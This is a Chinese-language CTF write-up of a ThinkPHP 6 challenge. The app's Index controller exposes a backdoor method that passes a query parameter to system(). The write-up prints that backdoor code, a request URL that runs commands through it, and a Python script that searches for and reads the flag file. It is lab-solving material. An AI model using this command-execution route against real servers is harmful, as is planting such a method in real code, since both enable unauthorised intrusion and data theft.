# week3BackDoor

## 题目简述

ThinkPHP 6 应用的 `Index` 控制器中保留了一个公开的 `backdoor($command)` 方法。默认控制器路由可直接调用该方法，并把查询参数 `command` 交给 `system()`，形成未授权命令执行。

## 解题过程

仓库源码中的后门只有两行核心逻辑：

```php
public function backdoor($command)
{
    system($command);
}
```

ThinkPHP 的控制器/方法路由可以通过 `index.php/<controller>/<method>` 访问，因此先请求：

```text
/index.php/index/backdoor?command=id
```

确认命令执行后，使用 `find` 搜索 flag 相关文件。参数应由 HTTP 客户端进行 URL 编码：

```python
import requests

endpoint = "http://challenge/index.php/index/backdoor"

response = requests.get(
    endpoint,
    params={"command": "find / -type f -name 'fl*' 2>/dev/null"},
    timeout=5,
)
print(response.text)
```

比赛环境中可定位到类似下面的随机 Session 目录：

```text
/tmp/sess_08j0e9v6uj9d1ed9dcrp4nltt2/fllaaagggg
```

再把 `command` 改为 `cat <实际搜索结果>` 即可读取 flag。这里的 Session 目录名属于临时运行状态，复现时必须以 `find` 的当前输出为准。

## 方法总结

本题不是利用 ThinkPHP 历史漏洞，而是应用自身公开了危险控制器方法。关键链路是“识别 ThinkPHP 路由 → 调用 `Index::backdoor` → `system()` 执行命令 → 搜索并读取随机路径中的 flag”。原外链只解释通用路由规则，正文已保留完成利用所需的信息，因此不再依赖该链接。
